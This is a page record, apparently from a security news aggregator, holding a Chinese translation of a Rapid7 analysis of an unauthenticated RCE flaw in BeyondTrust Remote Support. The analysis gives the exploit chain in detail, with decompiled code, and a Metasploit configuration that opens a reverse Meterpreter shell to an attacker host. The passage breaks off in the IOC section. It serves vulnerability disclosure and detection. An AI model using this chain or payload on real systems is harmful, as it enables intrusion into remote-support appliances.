[{"_1":2,"_3":4},"root",{"_5":146},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":46,"_47":48,"_49":50,"_51":52,"_53":54,"_55":37,"_56":37,"_57":58,"_59":37,"_60":61},"expiresAt",1793621936000,"id","els1gzklnlhxhh0k15ljle1lp","title","Rapid7 分析 BeyondTrust Remote Support 未认证文件上传至 RCE 漏洞 CVE-2026-102764","originalTitle","Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764)","summary","Rapid7 分析 BeyondTrust Remote Support 的来源校验缺陷 CVE-2026-102764，未认证攻击者可伪造本地消息来源，访问原生文件传输服务，写入任意文件并以站点操作系统用户身份执行代码，无需账户凭据或用户交互。","reason","文章从消息来源伪造到文件写入、PHP 执行逐段拆解利用链，并给出 Metasploit 模块与多类日志的排查要点，便于安全团队理解和检测该风险。","source",{"_73":145},"links",{"_136":144},"publishedAt","2026-10-30T16:01:53.000Z","discoveredAt","2026-10-30T17:48:15.917Z","timelineAt","category","disclosure","tags",[74,140,141,118,142,143],"score",77,"selected",true,"channel","news","story",{"_80":81,"_13":82},"x","readingMode","full","author","Jack Heysel","body",{"_61":135,"_136":-5,"_137":138,"_139":37},"outline",[83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98],"relatedStories",[79],"topics",[68,69,70],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation","bodyLanguage","zh","factId","fHL84vHBIzAE","reportCount",1,"additionalSourceCount",0,{"_71":77,"_73":78},{"_71":75,"_73":76},{"_71":72,"_73":74},"slug","research","name","技术研究","vuln","漏洞披露","rapid7","Rapid7 / Metasploit",{"_80":81,"_13":82},"publicId","2d2ef8a1-2a57-47fc-80df-3cd9457c40a7","Rapid7复现BeyondTrust未认证RCE",{"_11":133,"_100":134,"_102":116},{"_11":131,"_100":132,"_102":116},{"_11":129,"_100":130,"_102":116},{"_11":127,"_100":128,"_102":103},{"_11":125,"_100":126,"_102":103},{"_11":123,"_100":124,"_102":103},{"_11":121,"_100":122,"_102":103},{"_11":119,"_100":120,"_102":103},{"_11":117,"_100":118,"_102":116},{"_11":114,"_100":115,"_102":116},{"_11":112,"_100":113,"_102":103},{"_11":110,"_100":111,"_102":103},{"_11":108,"_100":109,"_102":103},{"_11":106,"_100":107,"_102":103},{"_11":104,"_100":105,"_102":103},{"_11":99,"_100":101,"_102":103},"sec-16","text","收集本机日志的位置","level",3,"sec-15","Brain 连接记录","sec-14","原生文件传输痕迹","sec-13","文件和连接","sec-12","URL 可能不包含 .php","sec-11","对已上传 PHP 端点的请求","sec-10","IOC",2,"sec-9","漏洞利用","sec-8","从文件上传到 PHP 执行","sec-7","选择文件内容和目标位置","sec-6","到达原生文件传输服务","sec-5","网络消息可以声称自己是本地消息","sec-4","启动匿名客户会话","sec-3","技术分析","sec-2","影响","sec-1","概述","<h2 id=\"sec-1\">概述</h2><p><span>BeyondTrust Remote Support 中的来源验证缺陷允许未经身份验证的攻击者在设备上写入文件，并以站点操作系统用户的身份执行代码。入口点是用于启动支持会话的公开客户连接。无需任何账户凭据或用户交互。</span></p><p><span>该缺陷位于内部消息路由器 </span><span>brain</span><span> 与设备端客户工作进程 </span><span>thin-scc</span><span> 之间。攻击者可以将保留的本地路由器 ID 放入消息的源地址中。路由器转发该消息，而工作进程会将该地址视为请求来自本地组件的证明。这使攻击者能够访问内部文件传输服务，包括其原生文件系统提供程序。</span></p><p><span>我们首先确认了文件写入，然后利用该原语将 PHP 文件上传到站点的公开目录。请求该文件后，我们得以站点用户身份执行代码。Metasploit 模块现已使用 PHP 和 Unix Command 目标实现此攻击链。</span></p><p><span>我们测试了 </span><span><strong>Remote Support 24.1.2, build 1524046</strong></span><span>，修订版本为 </span><span>4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3</span><span>。测试设备启用了公开的问题菜单会话启动和 thin chat（默认设置）。尚未确定其他受影响的版本和修复版本。该虚拟机的 Secure Remote Access 基础设备版本 </span><span><strong>7.1.0</strong></span><span> 与 Remote Support 应用版本相互独立。&nbsp;</span></p><h2 id=\"sec-2\">影响</h2><p><span>攻击者可以控制所上传文件的内容及其目标路径，但受工作进程文件系统权限的限制。同样的来源伪造也可用于调用文件发送操作。我们利用它获取了 </span><span>/proc/self/environ</span><span>，以确定 Remote Support 的基础安装路径，随后投放有效载荷</span></p><p><span>在测试的设备上，原生文件服务能够写入 PHP 文档根目录。Metasploit 模块返回以 </span><span>msfuser</span><span>（UID 1000）身份上下文执行代码的结果，这证明可作为站点用户实现未经身份验证的远程代码执行。</span></p><h2 id=\"sec-3\">技术分析</h2><p><span>我们将演示攻击者如何启动匿名会话，然后伪造一条会被设备接受为本地来源的消息。随后将概述如何访问原生文件传输服务、选择上传文件的内容和目标位置，并将文件写入转化为 PHP 执行。</span></p><p><span>地址使用 Ghidra 映像基址 </span><span>0x100000</span><span>。减去该值即可得到原始 ELF 虚拟地址。以 </span><span>FUN_</span><span> 开头的函数名是 Ghidra 标签；如果有可用的诊断字符串，则采用其中的描述性名称。</span></p><h3 id=\"sec-4\"><span>启动匿名客户会话</span></h3><p><span>我们首先通过 </span><span>POST /api/start_session</span><span> 获取两个客户密钥。这些是新生成的公开访客会话。密钥允许客户端使用客户传输通道，但不会标识已登录的账户。每个访客都通过 </span><span>/nw</span><span> WebSocket 端点连接，并使用原生或 thin 客户协议。</span></p><p><span>source/app/write_app_chooser_config:</span></p><pre><code>echo \"ingredi support desk customer:|$BG_app_root/data/tmp/brain.sock\" # [A1]\necho \"ingredi support desk customer thin:$BG_app_root/app/thin-scc-wrapper\" # [A2]</code></pre><p><span>app/write_app_chooser_config</span><span>显示了两个客户协议的去向。原生协议通过 </span><span>[A1]</span><span> 到达 brain socket；精简协议在 </span><span>[A2]</span><span> 启动一个包装器。</span></p><p><span>source/app/thin-scc-wrapper:</span></p><pre><code># ... omitted: protocol parsing and the alternative debug-site branch ...\n\nquoted=$(export PHPRC=\"$BG_app_root/config/php-cli.ini\"; echo $gskey | $ingrediRoot/app/dbquote)\nif [[ $(echo \"SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration&gt;NOW())\" | $db) != \"1\" ]]; then # [A3]\n    echo \"1 failure\" &gt;&amp;0\n    exit 0\nfi\n\n# ... omitted: reconnect throttling, customer-name setup, and settings generation ...</code></pre><p><span>app/thin-scc-wrapper</span><span>检查精简客户端的密钥是否属于 </span><span>[A3]</span><span> 处尚未过期的 </span><span>sdcust</span><span> 会话。通过公共会话启动端点获得的密钥能够通过此项检查。</span></p><p><span>app/thin-scc-wrapper</span><span>，会话检查之后：</span></p><pre><code>echo \"0 success\" &gt;&amp;0\nworkDir=`handleThinMint \"$thinMint\"` || exit\n\nif [[ ! -f \"$workDir/thin-scc\" ]]; then\n    pushd \"$workDir\"\n    cp $ingrediRoot/app/thin-scc .\n    # ... omitted: license, image, and settings.ini setup ...\nelse\n    pushd \"$workDir\"\nfi\n\nexport BRAIN_MELD_SOCKET_PATH=$ingrediRoot/data/tmp/brain.sock\n# ... omitted: server-side environment initialization ...\n./thin-scc # [A4] Starts the worker inside the appliance environment.\nexitStatus=$?</code></pre><p><span>随后，同一个包装器会准备工作目录，并在 </span><span>[A4]</span><span> 启动 </span><span>thin-scc</span><span>。即使该进程正在处理匿名客户的精简会话，它仍运行在设备上。</span></p><p><span>原生连接为我们提供内部消息路由系统的客户端，这里称为 MRS。精简连接则为我们提供设备端可寻址的工作进程。这两个步骤都不需要代表接受会话。</span></p><h3 id=\"sec-5\"><span>网络消息可以声称自己是本地消息</span></h3><p><span>MRS 地址由三部分组成：</span><span>node:router:handler</span><span>。每条消息都在 36 字节的头部中携带源地址和目标地址，该头部由九个小端序 32 位字段构成。</span></p><table><thead><tr><th><p><span><strong>头部偏移</strong></span></p></th><th><p><span><strong>字段</strong></span></p></th><th><p><span><strong>漏洞利用中使用的值</strong></span></p></th></tr></thead><tbody><tr><td><p><span>0x04</span></p></td><td><p><span>源节点</span></p></td><td><p><span>客户的常规节点</span></p></td></tr><tr><td><p><span>0x08</span></p></td><td><p><span>源路由器</span></p></td><td><p><span>更改为保留值 </span><span>1</span></p></td></tr><tr><td><p><span>0x0c</span></p></td><td><p><span>目标节点</span></p></td><td><p><span>工作进程的节点</span></p></td></tr><tr><td><p><span>0x10</span></p></td><td><p><span>目标路由器</span></p></td><td><p><span>工作进程的路由器</span></p></td></tr><tr><td><p><span>0x14</span></p></td><td><p><span>目标处理程序</span></p></td><td><p><span>主分发器，在受测构建版本中为 </span><span>2048</span></p></td></tr><tr><td><p><span>0x24</span></p></td><td><p><span>载荷</span></p></td><td><p><span>服务名称、换行符，然后是打包字段</span></p></td></tr></tbody></table><p><span>app/brain — 入站检查：</span></p><pre><code>if (*(int *)((long)param_2 + 0xc) == *(int *)(param_1 + 0x10)) {\n    *(uint *)(param_2 + 4) = (uint)*(byte *)(param_2 + 4);\n\n    if ((*(int *)(param_2 + 1) == *(int *)((long)param_1 + 0x84)) &amp;&amp;\n        (param_3 != (ulong **)0x0)) { // [B1] Rejects a network claim of this router's actual ID.\n        if (lRam0000000001ec8610 != 0) {\n            func_0x0168de00(\n                0x15, 3,\n                \"dropping spoofed message that came in from the network but has a routerID of our own\\n\"\n            );\n        }\n    }\n    else if (*(int *)((long)param_1 + 0x84) == *(int *)(param_2 + 2)) {\n        // ... omitted: delivery to a handler on this router ...\n    }\n    else {\n        // ... omitted: TTL checks, route lookup, and forwarding branches ...\n    }\n}</code></pre><p><span>app/brain</span><span>在 </span><span>FUN_01566ae0</span><span> 中有一项防欺骗检查，可通过其 </span><span>handleMessageFromOtherRouter</span><span> 诊断信息识别。在 </span><span>[B1]</span><span> 处，它会拒绝源路由器与接收路由器实际 ID 匹配的网络数据包。</span></p><p><span>这里，</span><span>param_1</span><span> 是接收路由器，</span><span>param_2</span><span> 是数据包，</span><span>param_3</span><span> 是传入连接。由于 </span><span>param_2</span><span> 指向八字节元素，因此 </span><span>*(int *)(param_2 + 1)</span><span> 会读取字节偏移 </span><span>0x08</span><span> 处的源路由器。</span></p><p><span>这就留下了一个缺口：该检查与实际路由器 ID 进行比较，而下游代码还会识别保留的本地别名。在此设备上，该别名为 </span><span>1</span><span>。</span></p><pre><code>// ... omitted: destination route resolution, loop checks, and diagnostic logging ...\nFUN_0155ec40(\n    ppuStack_1300,\n    ppuVar6,\n    param_2, // [B2] Forwards the packet carrying the caller-supplied source router.\n    (int *)((long)param_2 + 0x24)\n);</code></pre><p><span>同一个 </span><span>app/brain</span><span> 函数中的转发路径会在 </span><span>[B2]</span><span> 处继续转发数据包。它不会移除对工作进程本地来源检查至关重要的源声明。</span></p><p><span>app/brain — 本地地址谓词：</span></p><pre><code>bool FUN_0155ad40(long param_1, int *param_2)\n{\n    bool bVar1;\n\n    bVar1 = false;\n    if (*param_2 == *(int *)(param_1 + 0x80)) { // [C1] Address node must match the local node.\n        bVar1 = true;\n        if (param_2[1] != 1) { // [C2] Router 1 returns true without the actual-ID comparison.\n            return *(int *)(param_1 + 0x84) == param_2[1];\n        }\n    }\n    return bVar1;\n}</code></pre><p><span>本地地址判定条件明确揭示了这一不匹配问题。在 </span><span>app/brain</span><span> 中，</span><span>FUN_0155ad40</span><span> 首先检查 </span><span>[C1]</span><span> 处的节点。如果匹配，则路由器 </span><span>1</span><span> 足以使其在 </span><span>[C2]</span><span> 处返回 true；与实际本地路由器的比较会被跳过。</span></p><p><span>该规则实际上为 </span><span>节点 AND（路由器 == 1 OR 路由器 == 实际本地路由器）</span><span>。网络客户端提供的地址正被用于作出该判断。</span></p><p><span>app/thin-scc——消息来源包装器：</span></p><pre><code>UNRECOVERED_JUMPTABLE = *(code **)(**(long **)(*param_1 + 8) + 0x50);\n(*UNRECOVERED_JUMPTABLE)(\n    *(long **)(*param_1 + 8),\n    param_1 + 0xb, // [C3] Uses the dispatched message's sender address at byte offset 0x58.\n    UNRECOVERED_JUMPTABLE\n);</code></pre><p><span></span><span>app/thin-scc</span><span> 中对应的消息包装器会将消息发送方的地址传入其路由器对象的本地地址判定条件，位置在 </span><span>[C3]</span><span>。Ghidra 未能恢复这次间接调用的可靠原型；调用方会将结果作为布尔值使用。</span></p><p><span>我们使用同一个文件服务请求，在两种来源下检查了这一行为。普通客户来源在两秒的观察期间内未产生文件服务连接。将来源路由器更改为 </span><span>1</span><span> 后，worker 接受了该请求。</span></p><h3 id=\"sec-6\"><span>到达原生文件传输服务</span></h3><p><span>在 </span><span>app/thin-scc</span><span> 中，</span><span>FUN_0047a850</span><span> 分发文件传输消息。</span></p><p><span>app/thin-scc——文件传输分发器：</span></p><pre><code>cVar3 = func_0x0068e930(param_2); // [D1] Locality is derived from the message sender address.\nif (cVar3 == '\\0') {\n    if (lRam00000000009bade8 != 0) {\n        puVar5 = (undefined8 *)func_0x0068efe0(param_2);\n        func_0x00309380(0x66, 3, \"DISCARDING NONLOCAL MESSAGE: %s\\n\", *puVar5);\n    }\n}\nelse {\n    func_0x0046d370(aplStack_68, \"ftsName\");\n    lVar7 = param_2 + 0x28;\n    lVar1 = param_2 + 0x30;\n    lVar6 = func_0x002a1970(lVar7, aplStack_68);\n    if (lVar1 == lVar6) {\n        puVar5 = (undefined8 *)0x9c3700;\n    }\n    else {\n        puVar5 = (undefined8 *)(lVar6 + 0x40);\n    }\n\n    if ((puVar5[1] == *(long *)(param_1 + 0x2a8)) &amp;&amp;\n        ((puVar5[1] == 0 ||\n          (iVar4 = func_0x001804b0(*puVar5, *(undefined8 *)(param_1 + 0x2a0)),\n           iVar4 == 0)))) { // [D2] Matches the requested filesystem service name.\n        // ... omitted: string cleanup, optional reply check, and action dispatch shown below ...\n    }\n    // ... omitted: mismatched-name cleanup ...\n}</code></pre><p><span>它在 </span><span>[D1]</span><span> 处调用来源包装器；如果该包装器判定发送方不是本地节点，则丢弃消息。该检查通过后，</span><span>[D2]</span><span> 会将 </span><span>ftsName</span><span> 与服务实例的名称进行匹配。</span></p><p><span>同一函数仅在 </span><span>responseAddress</span><span> 字段非空时对其进行验证。漏洞利用省略了该字段，从而进入 </span><span>[D3]</span><span> 处的分支。</span></p><p><span>app/thin-scc</span><span>，</span><span>FUN_0047a850</span><span> 中的回复地址处理：</span></p><pre><code>func_0x0046d370(auStack_a8, \"responseAddress\");\nlVar6 = func_0x002a1970(lVar7, auStack_a8);\nif (lVar6 == lVar1) {\n    lVar6 = 0x9c3700;\n}\nelse {\n    lVar6 = lVar6 + 0x40;\n}\n\nif (*(long *)(lVar6 + 8) == 0) { // [D3] No reply-address validation when the field is empty.\n    func_0x001edfe0(auStack_a8);\n}\nelse {\n    func_0x0046d370(auStack_88, \"responseAddress\");\n    lVar8 = func_0x002a1970(lVar7, auStack_88);\n    lVar6 = lVar8 + 0x40;\n    if (lVar8 == lVar1) {\n        lVar6 = 0x9c3700;\n    }\n    func_0x006f2e80(auStack_b4, lVar6);\n    func_0x0046d370(aplStack_68, \"processMessage\");\n    cVar3 = func_0x0068e950(param_2, aplStack_68, auStack_b4); // [D4]\n    // ... omitted: temporary string destruction ...\n    if (cVar3 == '\\0') goto LAB_0047a8be;\n}</code></pre><p><span>在 </span><span>[D4]</span><span> 处调用的验证器会将回复地址与消息发送方地址进行比较。它不会独立确定发送方的来源，因此将该字段设为必填并不能修复来源伪造问题。</span></p><p><span>app/thin-scc</span><span>，</span><span>FUN_0047a850</span><span> 中的操作处理：</span></p><pre><code>// ... omitted: action extraction and unrelated action cases ...\niVar4 = func_0x0046d240(uVar9, uVar2, \"DownloadAnonymousFiles\");\nif (iVar4 == 0) {\n    uVar9 = FUN_00475820(param_1, param_2); // [D5] Receives a file into the selected provider.\n    goto LAB_0047a8c0;\n}\n\n// ... omitted: DownloadFiles case ...\niVar4 = func_0x0046d240(uVar9, uVar2, \"UploadFiles\");\nif (iVar4 == 0) {\n    uVar9 = FUN_00477be0(param_1, param_2); // [D6] Sends a file from the selected provider.\n    goto LAB_0047a8c0;\n}</code></pre><p><span>随后，分发器在 </span><span>[D5]</span><span> 处公开 </span><span>DownloadAnonymousFiles</span><span>，并在 </span><span>[D6]</span><span> 处公开 </span><span>UploadFiles</span><span>。</span></p><p><span>这些操作名称描述的是 worker 在传输中的职责。<span>DownloadAnonymousFiles</span><span> 将字节接收到设备上；<span>UploadFiles</span><span> 将文件发送出去。为了上传我们的文件，我们让 worker 从我们控制的 MRS 监听器下载该文件。</span></span></span></p><p><span>这里需要特别注意的一点是，worker 拥有多个文件系统提供程序。<span>session</span><span> 服务将文件系统工作委派给浏览器。通过该服务成功完成传输，并不能证明文件已写入设备。<span>local</span><span> 服务则使用原生文件对象。</span></span></span></p><p><span>app/thin-scc——原生服务构造：</span></p><pre><code>uVar3 = func_0x00770620(0x310);\nplVar4 = (long *)func_0x00770620(8);\nfunc_0x003454a0(plVar4); // [E1] Constructs the native filesystem provider.\n\npplStack_c0 = (long **)0x0;\nplStack_c8 = plVar4;\npplStack_c0 = (long **)func_0x00770620(0x18);\nplVar1 = _DAT_007d4de0;\npplStack_c0[2] = plVar4;\npplStack_c0[1] = plVar1;\n*pplStack_c0 = (long *)&amp;UNK_0098cee0;\n\nplStack_60 = (long *)0x5;\nuStack_58 = (long *)CONCAT26(uStack_58._6_2_, 0x6c61636f6c); // [E2] ASCII \"local\".\nplStack_68 = &amp;uStack_58;\nFUN_00472550(uVar3, &amp;plStack_68, param_3, &amp;plStack_c8); // [E3] Service receives name and provider.\nparam_1[0x9d] = uVar3;\n\n// ... omitted: string/provider reference cleanup and other ServerContext services ...</code></pre><p><span>位于 </span><span>app/thin-scc</span><span> 中的 </span><span>ServerContext</span><span> 构造函数（</span><span>FUN_002ae620</span><span>）会在 </span><span>[E1]</span><span> 创建该原生提供程序。它在 </span><span>[E2]</span><span> 构建名称 </span><span>local</span><span>，并在 </span><span>[E3]</span><span> 将两者传递给文件传输服务构造函数。</span></p><p><span>因此，该漏洞利用使用 </span><span>ftsName=local</span><span>。原生文件工厂分析会沿着该提供程序进入原生文件构造函数和文件系统信息构造函数。</span></p><h3 id=\"sec-7\"><span>选择文件内容和目标位置</span></h3><p><span>app/thin-scc</span><span> 中的 </span><span>FUN_00475820</span><span> 处理 </span><span>DownloadAnonymousFiles</span><span>。&nbsp;</span></p><p><span>app/thin-scc——匿名下载请求：</span></p><pre><code>// ... omitted: overwrite/resume options and transfer metadata setup ...\nfunc_0x0046d370(aplStack_128, \"downloadToken\");\nlVar8 = func_0x002a1970(lVar12, aplStack_128);\nlVar6 = lVar8 + 0x40;\nif (lVar8 == param_2) {\n    lVar6 = 0x9c3700;\n}\nfunc_0x001edf30(&amp;puStack_68, lVar6); // [F1] Caller-supplied transfer token.\n\nfunc_0x0046d370(aplStack_148, \"serverAddress\");\nlVar8 = func_0x002a1970(lVar12, aplStack_148);\nlVar6 = lVar8 + 0x40;\nif (lVar8 == param_2) {\n    lVar6 = 0x9c3700;\n}\nfunc_0x006f2e80(auStack_1e4, lVar6); // [F2] Caller-supplied MRS file-server address.\n\nfunc_0x0046d370(aplStack_168, \"path\");\nlVar8 = func_0x002a1970(lVar12, aplStack_168);\nlVar6 = lVar8 + 0x40;\nif (lVar8 == param_2) {\n    lVar6 = 0x9c3700;\n}\nfunc_0x001edf30(aplStack_88, lVar6); // [F3] Caller-supplied destination path.\n\nuVar13 = (ulong)(iVar4 != 0);\niStack_1e8 = func_0x004a21c0(\n    param_1, aplStack_88, auStack_1e4, &amp;puStack_68, auStack_198, iVar5 == 0\n); // [F4] Starts the download using the supplied path, server, and token.\n\n// ... omitted: temporary destruction and transfer-response construction ...</code></pre><p><span>该函数读取请求的传输令牌（</span><span>[F1]</span><span>）、MRS 服务器地址（</span><span>[F2]</span><span>）和目标路径（</span><span>[F3]</span><span>）。这三个值都会到达 </span><span>[F4]</span><span> 处的下载例程。</span></p><p><span>在此摘录中，</span><span>lVar12</span><span> 指向请求的字段映射。</span><span>param_2</span><span> 已经推进到其映射结束哨兵；</span><span>0x9c3700</span><span> 表示值不存在。</span></p><p><span>app/thin-scc——MRS 下载连接：</span></p><pre><code>(**(code **)(**(long **)(param_1 + 8) + 0x18))(\n    &amp;lStack_d8, *(long **)(param_1 + 8), param_3, 10000\n); // [G1] Connects to the serverAddress supplied to this routine as param_3.\n\nif ((lStack_d8 == 0) ||\n    ((*(char *)(lStack_d8 + 0x30) != '\\0' &amp;&amp;\n      (*(char *)(lStack_d8 + 0x31) != '\\0')))) {\n    uVar4 = 0;\n}\nelse {\n    // ... omitted: request-map initialization ...\n    func_0x00490020(&amp;plStack_68, \"request\");\n    lVar5 = func_0x00202790(auStack_b8, &amp;plStack_68);\n    func_0x001f5f10(\n        lVar5, 0, *(undefined8 *)(lVar5 + 8), \"get anonymous file\", 0x12\n    ); // [G2]\n\n    // ... omitted: temporary key-string destruction ...\n    func_0x00490020(&amp;plStack_68, \"token\");\n    uVar6 = func_0x00202790(auStack_b8, &amp;plStack_68);\n    func_0x001ee710(uVar6, param_4); // [G3] Copies the caller's downloadToken.\n\n    // ... omitted: info field, serialization, send, and receive-thread setup ...\n}</code></pre><p><span>位于 </span><span>0x004a21c0</span><span> 的下载例程会在 </span><span>[G1]</span><span> 打开指向我们地址的 MRS 流。它在 </span><span>[G2]</span><span> 发送 </span><span>get anonymous file</span><span>，并在 </span><span>[G3]</span><span> 附带我们的令牌。由于我们控制监听器，令牌可以是 24 个字符的随机字符串。</span></p><pre><code>// ... omitted: stream setup, relay metadata, and reference management ...\npuVar7 = (undefined8 *)func_0x00770620(0x450);\n// ... omitted: temporary setup and resume calculation ...\nfunc_0x004a0700(puVar7, param_1, param_5, bVar8, param_7, param_8);\npuVar7[0x81] = lStack_d8;\npuVar7[0x82] = lVar5;\n*puVar7 = &amp;UNK_0099d3f8;\n// ... omitted: relay address and transfer bookkeeping ...\nfunc_0x001ee710(puVar7 + 0x13, param_2); // [G4] Retains the requested destination path.\n// ... omitted: transfer registration and reference management ...\nfunc_0x002fcae0(puVar7, 0x400000); // [G5] Starts the receive-files thread.</code></pre><p><span>同一个 </span><span>app/thin-scc</span><span> 例程会在 </span><span>[G4]</span><span> 将目标路径放入接收文件线程，并在 </span><span>[G5]</span><span> 启动该线程。</span></p><p><span>app/thin-scc——接收文件循环：</span></p><pre><code>// ... omitted: \"want file?\" command match ...\nfunc_0x00490020(ppplVar20, \"dest_filename\");\nuVar12 = func_0x00202790(plStack_888, ppplVar20);\npuStack_8b8 = &amp;uStack_418;\nfunc_0x001edf30(puStack_8b8, uVar12); // [H1] Copies the destination from transfer metadata.\n\n// ... omitted: provider filesystem-info query and reference cleanup ...\nbStack_931 = *(byte *)(plStack_848 + 0x1c);\npplStack_8d8 = (long **)(((ulong)pplStack_8d8 &amp; 0xffffffffffffff00 |\n                         (ulong)bStack_931) ^ 1);\npuStack_900 = auStack_3f8;\nif (bStack_931 == 1) {\n    func_0x001edf30(puStack_900, puStack_8b8);\n}\nelse {\n    func_0x001fabe0(puStack_900, puStack_8b8, \".n$t\"); // [H2] Temporary receive path.\n}</code></pre><p><span>位于 </span><span>0x001d6430</span><span> 的接收循环会处理我们通过该流发送的文件元数据。它在 </span><span>[H1]</span><span> 复制 </span><span>dest_filename</span><span>。根据提供程序的文件信息，它会将内容接收到该路径或以 </span><span>.n$t</span><span> 结尾的临时路径（</span><span>[H2]</span><span>）。</span></p><pre><code>// ... omitted: \"begin file\" handling and provider file-object creation ...\nfunc_0x00321f50(plStack_828, puStack_928);\nplVar11 = plStack_828;\npcVar19 = *(code **)(*plStack_828 + 0xc0);\nfunc_0x00490020(ppplVar20, \"a+b\");\ncVar5 = (*pcVar19)(plVar11, puStack_900, ppplVar20, lStack_908); // [H3] Opens the receive file.\n\n// ... omitted: open-failure handling, positioning, and transfer-loop branches ...\niVar7 = (**(code **)(*plVar11 + 0x20))(plVar11, plVar1, pplVar21, pplVar25, 1);\nif (0 &lt; iVar7) {\n    pplStack_8d8 = (long **)(long)iVar7;\n    lVar14 = *plStack_828;\n    *(long *)(param_1 + 0x160) = (long)pplStack_8d8 + *(long *)(param_1 + 0x160);\n    *(long *)(param_1 + 0x168) = (long)pplStack_8d8 + *(long *)(param_1 + 0x168);\n    iVar9 = (**(code **)(lVar14 + 0xd8))(plStack_828, plVar1); // [H4] Writes received data.\n    if (iVar7 != iVar9) {\n        // ... omitted: errno extraction and \"error writing to file\" response ...\n    }\n    // ... omitted: progress and completion handling ...\n}</code></pre><p><span>在被省略的 </span><span>begin file</span><span> 代码执行完毕后，同一个 </span><span>app/thin-scc</span><span> 接收器会在 </span><span>[H3]</span><span> 打开文件，并在 </span><span>[H4]</span><span> 写入传入的数据。&nbsp;</span></p><p><span>完成后，接收器关闭文件；使用临时路径时，会将其重命名为最终目标位置。该服务已经接受绝对目标路径，因此不需要目录遍历。工作者信任伪造的本地源地址，所以会允许该请求。</span></p><h3 id=\"sec-8\"><span>从文件上传到 PHP 执行</span></h3><p><span>下一步是选择一个可写位置，供 Web 服务器执行其中的文件。提供的 config/apache_vhost.conf 将文档根目录设置为：</span></p><pre><code>/home/msfuser/ingredi-24.1.2/app/www/public</code></pre><p><span>向该目录进行绝对路径上传已成功。不过，请求该文件时存在一个小问题：即使文件存在，以 </span><span>.php</span><span> 结尾的 URL 仍会返回 404。</span><span>app/www/public/.htaccess</span><span> 解释了原因。&nbsp;</span></p><p><span>source/app/www/public/.htaccess：</span></p><pre><code># ... omitted: application routes and compatibility rewrites ...\nRewriteCond %{THE_REQUEST} \"^[^ ]* .*?\\.php[?/ ].*$\"\n# [I1] Direct .php URLs return 404.\nRewriteRule .* - [L,R=404]\n\n# ... omitted: download-helper routes ...\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\n# [I2] An extensionless URL executes the existing PHP file.\nRewriteRule ^(.+)$ $1.php [L]</code></pre><p><span>位于 </span><span>[I1]</span><span> 的规则拒绝直接 </span><span>.php</span><span> 请求。位于 </span><span>[I2]</span><span> 的规则将无扩展名的 URL 映射到现有的 PHP 文件。</span></p><p><span>请求已上传文件的基本文件名（不带</span><span>.php</span><span>）执行了我们的有效载荷。它返回了绝对文件名、EUID 1000 以及</span><span>id</span><span>的输出。&nbsp;</span></p><p><span>我们还想避免猜测 Remote Support 的工作目录或带版本号的安装名称。同一原生服务可以使用</span><span>UploadFiles</span><span>将 worker 的</span><span>/proc/self/environ</span><span>发送给我们。在此设备上，其内容如下：</span></p><pre><code>BG_app_root=/home/msfuser/ingredi-24.1.2\nBRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock</code></pre><p><span>BG_app_root</span><span>直接给出了安装目录。附加</span><span>/app/www/public</span><span>即可得到上传目标；socket 路径则提供了识别同一根目录的另一种方式。协议上有一个问题：procfs 报告环境文件的大小为零，但 worker 仍会流式传输其内容。我们必须读取到数据流的 EOF，而不能根据所报告的大小停止读取。&nbsp;</span></p><h2 id=\"sec-9\">漏洞利用</h2><p><span>Metasploit 模块使用两个新建的公共客户会话执行该利用链。它通过</span><span>Director.GetGatewaySessionValues</span><span>为自身的 thin guest 发现 thin worker，向 worker 的主调度器发送伪造的</span><span>LocalFileTransfer</span><span>请求，并通过现有的 MRS 连接提供 PHP 字节。无需单独的上传服务器。</span></p><p><span>该模块将随机生成的 PHP 文件名写入站点的 public 目录，然后向无扩展名的 URL POST 一个执行令牌。PHP 文件检查该令牌，并在执行有效载荷前删除自身。目标</span><span>0</span><span>运行 PHP 有效载荷；目标</span><span>1</span><span>在 PHP 中封装 Unix 命令。</span></p><p><span>对于 PHP Meterpreter 有效载荷，基本配置如下：</span></p><pre><code>use exploit/linux/http/beyondtrust_rs_mrs_file_upload\nset RHOSTS 192.168.1.98\nset TARGET 0\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST 192.168.1.68\nrun verbose=true</code></pre><p><span>选择目标</span><span>0</span><span>和兼容的命令有效载荷，例如</span><span>php/meterpreter/reverse_tcp</span><span>。模块文档介绍了目录覆盖及其他选项。</span></p><p><span><span><span><img src=\"/dailyinfo/media/20bb8515032c679f.webp\" srcset=\"/dailyinfo/media/4cb142be891bf293.webp 720w, /dailyinfo/media/2baf24e0e2976d99.webp 1200w, /dailyinfo/media/20bb8515032c679f.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"bt_rs_ra_1.png\" width=\"856\" height=\"427\"></span></span></span></p><p><span><em>图 1：使用 Metasploit 利用匿名文件传输服务。</em></span></p><p><span>测试产生了两个 PHP Meterpreter 会话、一个经命令封装的 PHP Meterpreter 会话以及一个 Bash shell。两个目标也都在禁用 AutoCheck 的情况下运行过，并且立即重复利用成功。Bash shell 返回：</span></p><pre><code>uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),16(cron),70(postgres)</code></pre><h2 id=\"sec-10\">IOC</h2><p><span>以下摘录涵盖了 HTTP 请求、</span><span>thin-scc</span><span>中的原生文件传输活动，以及</span><span>brain</span><span>记录的客户连接。它们来自我们于</span><span><strong>2026 年 10 月 28–29 日</strong></span><span>在实验室进行的测试。保留了原始时间戳、地址和路径；会话与传输令牌已按说明进行了遮盖。省略了无关条目。</span></p><p><span>站点日志存储在</span><span>$BG_app_root/log/</span><span>下，其中</span><span>BG_app_root</span><span>标识 Remote Support 